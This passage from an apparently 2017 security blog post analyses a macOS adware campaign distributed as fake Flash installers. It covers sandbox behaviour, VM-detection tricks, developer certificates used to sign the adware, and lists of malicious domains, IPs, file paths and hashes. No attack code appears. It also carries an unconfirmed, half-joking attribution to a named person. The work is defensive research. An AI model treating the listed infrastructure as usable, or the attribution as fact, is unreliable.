https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=252%2C300&amp;ssl=1 252w" sizes="(max-width: 275px) 100vw, 275px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?ssl=1"><img data-attachment-id="694" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c72309c103/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=732%2C1051&amp;ssl=1" data-orig-size="732,1051" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c72309c103" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=209%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=604%2C867&amp;ssl=1" class="alignnone wp-image-694 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=224%2C322&#038;ssl=1" alt="" width="224" height="322" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?w=732&amp;ssl=1 732w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=209%2C300&amp;ssl=1 209w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=713%2C1024&amp;ssl=1 713w" sizes="(max-width: 224px) 100vw, 224px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?ssl=1"><img data-attachment-id="695" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7244ef84c/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=917%2C1413&amp;ssl=1" data-orig-size="917,1413" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7244ef84c" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=195%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=604%2C930&amp;ssl=1" class="alignnone wp-image-695 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=297%2C458&#038;ssl=1" alt="" width="297" height="458" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?w=917&amp;ssl=1 917w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=195%2C300&amp;ssl=1 195w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=768%2C1183&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=665%2C1024&amp;ssl=1 665w" sizes="(max-width: 297px) 100vw, 297px" data-recalc-dims="1" /></a></p>
<p>Move on to the network DNS feature, we see a lot of queries and some domains look "suspicious". Their DNS servers mostly are pointed to Akamai so I suggest we rather use domain as IOC than IP address, which could be different from viewers location. Filtering system calls logs with some rules of mine, there is no evasion technique been found. Itâ€™s quite surprising because Virustotal behavioral analysis shows a shorter execution trace than mine, which usually means its environment was detected at some point and malware stop running. In Patrickâ€™s report he said there might be MAC address verification to detect VM (VM MAC usually starts with â€™00:xxâ€™). Fortunately, my VM framework MAC address was modified long ago since my colleague Yorick Koster at Securify used same trick to abuse my lame framework (thanks Yorick). I should add new rule â€“ â€œMAC address checkâ€ later.</p>
<p id="zFlKkqi"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?ssl=1" target="_blank" rel="noopener"><img data-attachment-id="698" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c755999974/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=1949%2C1982&amp;ssl=1" data-orig-size="1949,1982" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c755999974" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=295%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=604%2C614&amp;ssl=1" class=" alignnone wp-image-698 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=604%2C614&#038;ssl=1" alt="" width="604" height="614" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1949&amp;ssl=1 1949w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=295%2C300&amp;ssl=1 295w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=768%2C781&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=1007%2C1024&amp;ssl=1 1007w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Additionally instead of execve(), MacOS sandbox policy usually invokes processes using XPCProxy or launchd services. So we got several processes created with posix_spawn(): delete Safari, iBooks, Mail cache (likely Advanced Mac cleaner doing its job), install mentioned PUAs and we got some new IOCs.</p>
<p id="daBSQQC"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?ssl=1"><img data-attachment-id="699" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c75725dafc/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=1950%2C755&amp;ssl=1" data-orig-size="1950,755" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c75725dafc" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=300%2C116&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=604%2C234&amp;ssl=1" class="alignnone wp-image-699 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=604%2C234&#038;ssl=1" alt="" width="604" height="234" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1950&amp;ssl=1 1950w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=300%2C116&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=768%2C297&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=1024%2C396&amp;ssl=1 1024w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Other great things from Cuckoo sandbox are Network analysis and Dropped files. However previous report detailed it well enough, hence only some screenshots from these features will be showed:</p>
<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="0f0a61788ffe53be1f1a08be33150962.json"></div>
<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="1830a8eb98f5ba755f1947386f7f93a0.json"></div>
<p>Some dropped binaries like AMCleaner (93dd0c34a4ec25a508cd6d5fb86d8ccc0c318238d9fee0c93342a20759bf9b7e) already marked as malicious on VirusTotal (VT) 7/56, which could be an indication for vigilant users.</p>
<p>Also with some fancy nonsense statistic screenshots, intent to scare analyst (:p)</p>
<p id="MQRWKqm"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?ssl=1"><img data-attachment-id="702" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7796efc07/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=1950%2C987&amp;ssl=1" data-orig-size="1950,987" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7796efc07" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=604%2C306&amp;ssl=1" class="alignnone size-full wp-image-702 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1950&amp;ssl=1 1950w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=768%2C389&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=1024%2C518&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p id="WVLWtXn"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?ssl=1"><img data-attachment-id="703" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c779ebc535/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=1950%2C880&amp;ssl=1" data-orig-size="1950,880" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c779ebc535" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=300%2C135&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=604%2C273&amp;ssl=1" class="alignnone size-full wp-image-703 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1950&amp;ssl=1 1950w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=768%2C347&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>At this moment, we have got all indicators to make behavioral detection rule and go hunting for other similar adware samples. Reason why I call this blog post â€“ â€œa campaignâ€: there are numerous similar packed DMG/Mac apps matched â€˜my behavioral ruleâ€™: fake Adobe Flash installer, lots of PUAs from subdomain name [cdn, dl, api] and Vietnamese developer certificate ID.</p>
<p>&nbsp;</p>
<table width="470">
<tbody>
<tr>
<td width="107"><strong>Developer ID</strong></td>
<td width="75"><strong>Number of Samples</strong></td>
<td width="95"><strong>Detected (VT)</strong></td>
<td width="92"><strong>Apple status</strong></td>
<td width="101"><strong>First seen</strong></td>
</tr>
<tr>
<td width="107">Quoc Thinh</p>
<p>9G2J3967H9</p>
<p>&nbsp;</td>
<td width="75">6</td>
<td width="95">1/6 (Ikarus detected 1 sample)</td>
<td width="92">Revoked ID</td>
<td width="101">2017-08-05</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Pham Huong</p>
<p>2BS26F3ZCP</td>
<td width="75">7</td>
<td width="95">0</td>
<td width="92">Revoked ID</td>
<td width="101">2017-07-15</td>
</tr>
<tr>
<td width="107">Phan Anh</p>
<p>C7J9SJ95GX</td>
<td width="75">24</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-04-13</td>
</tr>
<tr>
<td width="107">Nhien Nguyen</td>
<td width="75">3</td>
<td width="95">1/3 (ESET-NOD32 detected 1 sample)</td>
<td width="92">Valid</td>
<td width="101">2017-08-09</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Thanh Thuy WAA98JBA59</td>
<td width="75">17</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-07-06</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Tran Phong GMFY4TULB3</td>
<td width="75">6</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-06-27</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Minh Duc</p>
<p>7CXE5FM69W</td>
<td width="75">5</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-06-21</td>
</tr>
<tr>
<td width="107">Mai Linh</p>
<p>M3XXTCHY66</td>
<td width="75">3</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-07-12</td>
</tr>
<tr>
<td width="107"><strong><em>Total</em></strong></td>
<td width="75"><em>71</em></td>
<td width="95"><em>2 (3%)</em></td>
<td width="92"><em>2/8 Revoked ID</em></td>
<td width="101"><em>Staying undetected at least 4 months</em></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Please note that VT score is an indicator only, people usually fail to judge hardworking AVs by looking at VT score. We can never know if AV would detect those adwares live running whether or not. Also instead of Mughthesec, other adware use different loader names such as SearchWebSvc, TrustedSafeFinder, etc. I donâ€™t think OSX/Mughthesec would be appropriate for the adware name. I suggest it would be OperatorMac because all campaign packages call a simple loader â€œmacâ€ binary.</p>
<p><strong>Conclusion</strong></p>
<p>Be <strong>vigilant</strong>, no one needs Flash nowadays itâ€™s dead. Apple Mac is not virus-free even with those fancy Apple protection XProtect, GateKeeper, Mac sandbox, code signing, etc, many security researchers already warned.</p>
<p>Itâ€™s likely an affiliation advertising campaign, in which adware authors spent quite some money (~$800) for these 8 Apple developer certificates and only 2 of them are revoked. Some of dropped MachO executables are not signed, and we donâ€™t know what if those can be really dangerous (like the unsigned MachO executable from APT32 Ocean Lotus campaign targeted Vietnamese organizations lately is really a sophisticated one). Based on timeline and periods of certificate registration, and money they have spent, I doubt these adware creators are making lots of money. Last, let me remind you some incidents happened recently and could be related to this campaign:</p>
<ul>
<li><a href="http://genk.vn/chuyen-gia-bao-mat-phat-hien-duong-day-chiem-doat-tai-khoan-ngan-hang-facebook-gmail-cuc-lon-o-viet-nam-ban-cung-co-the-la-nan-nhan-20170622230143671.chn">Malicious browser extension â€“ fake IDM Downloader harvested around 5M cookies from popular websites, targeted Vietnamese netizens.Â </a></li>
<li><a href="https://www.techsignin.com/tintuc/lua-dao-tu-viet-nam-kiem-hon-80-000-usdthang-tu-apple-store/">Fake App store AV app â€“ making more than $80K per month.Â </a></li>
</ul>
<p><a href="https://twitter.com/phd_phuc">Phamus</a></p>
<p><strong>P/S: </strong>I confronted one famous hacker in cyber pirate community â€“ â€œQuoc Thinhâ€ aka G4mm4, he seriously admitted he's behind the "crime". Not sure thatâ€™s true or he was just kidding <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60f.png" alt="ğŸ˜" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?ssl=1"><img data-attachment-id="704" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c77b2a0e82/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=729%2C461&amp;ssl=1" data-orig-size="729,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c77b2a0e82" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=300%2C190&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=604%2C382&amp;ssl=1" class="alignnone size-full wp-image-704 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=604&#038;ssl=1" alt="" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=729&amp;ssl=1 729w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?resize=300%2C190&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><strong>IOCs:</strong></p>
<p><strong>appfastplay.com</strong></p>
<p>Created</p>
<table width="416">
<tbody>
<tr>
<td>2017-04-08</td>
<td>New</td>
<td>-none-</td>
<td>198.54.117.212</td>
</tr>
<tr>
<td>2017-04-23</td>
<td>Change</td>
<td>198.54.117.212</td>
<td>198.54.117.215</td>
</tr>
<tr>
<td>2017-07-07</td>
<td>Change</td>
<td>198.54.117.215</td>
<td>198.54.117.210</td>
</tr>
</tbody>
</table>
<p>Namecheap domain hosting @ USA.</p>
<p><strong>mughthesec.com</strong></p>
<p>198.54.117.210</p>
<p><strong>SimplyEApps.com</strong><br />
198.54.117.210</p>
<p><strong>(api./dl./cdn.)dynacubeapps.com</strong></p>
<p>198.54.117.210</p>
<p><strong>(api./dl./cdn.)cloudmacfront.com</strong></p>
<p><strong>(api./dl./cdn.)api.airautoupdates.com</strong></p>
<p><strong>(api./dl./cdn.)osxessentials.com</strong></p>
<p><strong>(api./dl./cdn.)api.vertizoom.com</strong></p>
<p><strong>(api./dl./cdn.)macgabspan.com</strong></p>
<p><strong>install.searchwebsvc.com</strong></p>
<p><strong>install.trustedsafefinder.com</strong></p>
<p><strong>searc.trustedsafefinder.com/h?_pg=XXXX-1234-67890</strong></p>
<p><strong>searc.trustedsafefinder.com/s?q=@@@&amp;_pg=XXXX-1234-67890</strong></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong>~/Library/LaunchAgents/com.Mughthesec.plist</strong></p>
<p><strong><span class="mono">~/Library/Application Support/com.Mughthesec</span></strong></p>
<p><strong>~/Library/LaunchAgents/SearchWebSvc.plist</strong></p>
<p><strong><span class="mono">~/Library/Application Support/SearchWebSvc</span></strong></p>
<p><strong>~/Library/LaunchAgents/TrustedSafeFinder</strong></p>
<p><strong><span class="mono">~/Library/Application Support/com.TrustedSafeFinder.plist</span></strong></p>
<p>&nbsp;</p>
<p><strong>~/Library/LaunchAgents/com.pcv.hlpramcn.plistÂ  (Advanced Mac Cleaner)</strong></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><em>phan anh 4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
<p><em>4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
<p><em>cf63d5861eb654efcafef25d758ca5daf877e3c63888ee086bcd29f22e3f77ad</em></p>
<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
<p><em>8690299992e9a1d8bf1b5184a3274619eb6c95c44a83b42f7ee455b419947d5d</em></p>
<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
<p><em>f47246e7b4ae43d6aa284145292d67247d428d52f327c00a7f7af2dd65fb1c0b</em></p>
<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
<p><em>52ac6206d109acb15547e8f655d1e522d28bbb39c9e40784126de5f27778f51c</em></p>
<p><em>cd9c564799f88ad6efae4bd5acb047d5f0d5b39378965386925c171eec3977b5</em></p>
<p><em>15d796bd76339a0fbb430bc8c6cc9bcbd6a21f3aef619d0cb81fe0069552a29d</em></p>
<p><em>99c598ef5fe10347803296d20a37fb6c33d793f35443725dbcfc41382dbd9391</em></p>
<p><em>34886986af88810585238c2ecf44924e48a08f775b25794e553689f0f2585899</em></p>
<p><em>12effeff2bc280d144bd1432f9bbfae2efaae483731d20b6f0b061e8be505a0c</em></p>
<p><em>3460877be00af3632895539567b57647ca1e07363213b4f93d52ac80b17454ee</em></p>
<p><em>79b54c71b74112881a8c4b88ad36a9bae4c2eecedcba510e2b4f52c215a9ebac</em></p>
<p>&nbsp;</p>
<p><em>quoc thinh</em><br />
<em> 9c4f74feff131fa93dd04175795f334649ee91ad7fce11dc661231254e1ebd84</em></p>
<p><em>f5d76324cb8fcae7f00b6825e4c110ddfd6b32db452f1eca0f4cff958316869c</em></p>
<p><em>63b9e81a0c3a57bcbaf2aac308ecc53035f7fff6a416a6752acf13f16352a94a</em></p>
<p><em>431c30c1db1aefb87d5fa5485c0fd11e792ec94bb95fb401cc93ef0528ad41cb</em></p>
<p><em>687def9ff3cd0fa8dab1a7d4da5fa04b0604292fa74a66f23a96fb1eb31cd2c2</em></p>
<p>&nbsp;</p>
<p><em>pham huong</em></p>
<p><em>af1e6391dd48f84beac69fbd69dbbb20eefd7ca69d33c686ed4d5a85ba760254</em></p>
<p><em>7ce4d0ec31dc334388d2461b65617ba5dbdebf935da2ed2a7d65d8a9cc14148c</em></p>
<p><em>f995bd07e5f782cf823b45d226c63407695d4a1bfb06358f49621291f1629f60</em></p>
<p><em>a2bd399d8087752776762fa9a805429de6973994f26e17bdac9ca4130dcb87fb</em></p>
<p><em>bafe800c397e69e9e6859311c437e5c4b6cdd200f3ed832306e6c9f331eb6bae</em></p>
<p>&nbsp;</p>
<p><em>nhien nguyen</em></p>
<p><em>3028aa7ece2f140f6fa28d348bf18156e6e4da4cb2f9208925d15ca7b564f35f</em></p>
<p><em>fc89afe4f72c3e02dca3e998351e59684f5ad6a9000c9f2eaee3b7195d4f0fda</em></p>
<p>&nbsp;</p>
<p><em>minh duc</em></p>
<p><em>17f39a0268ec97cf5528bcc9d871c7f7b428379a2549c3b01581440acd7ed8a5</em></p>
<p><em>79e821bab2adbdb9a53e471b7a1937c8f0a1ba1ce0801b8d2eca49a7c9391e42</em></p>
<p><em>dfc0b3618a3eb246ae6026c460596a102f45ff71660f7fdec39c5f105a3190cd</em></p>
<p><em>90d825d481297def07771865a5e719c4e55ed1109008721744608bf94841d7cc</em></p>
<p>&nbsp;</p>
<p><em>tran phong</em></p>
<p><em>8c1b1b2b997a11d8b408091e12d02960bf71bb83304a3b23c439056c4e9882ad</em></p>
<p><em>9acb781d19d6ed4c6ac6e10448d113fca868bba21f95496f535013005fe2d29e</em></p>
<p><em>f159c3dc2aa704d42a07f145985fa7b339cbd4bcdf7ff9783220b9dd3a9e097e</em></p>
<p><em>a1dc898586e1697bd19d6c6ec8421e1871ac918132bcbcf89db9b523e199664d</em></p>
<p><em>e537d868f9ab708e3c5a8427dd4036798570b7d6b55b3ef0e1be9775e64e9c9d</em></p>
<p><em>f7468d3af9267e9a6325fb981a5bd734dafeea32265d0318cb4793bd1b52f112</em></p>
<p>&nbsp;</p>
<p><em>mai linh</em></p>
<p>&nbsp;</p>
<p><em>c7c11ae9fdaeef0c359621de06d4de5264cc3d62929d5e8a1e2c3d2c08290e2f</em></p>
<p><em>202d7e5bd230c59051d5c21124e9af613f70576f3511a0a79c567f48844e5b45</em></p>
<p>&nbsp;</p>
<p><em>thanh thuy</em></p>
<p><em>6494a2bd4e9da2f3000b0774a13682a3f9fcd17e7da8d0fd42bfa88d1dce14f5</em></p>
<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
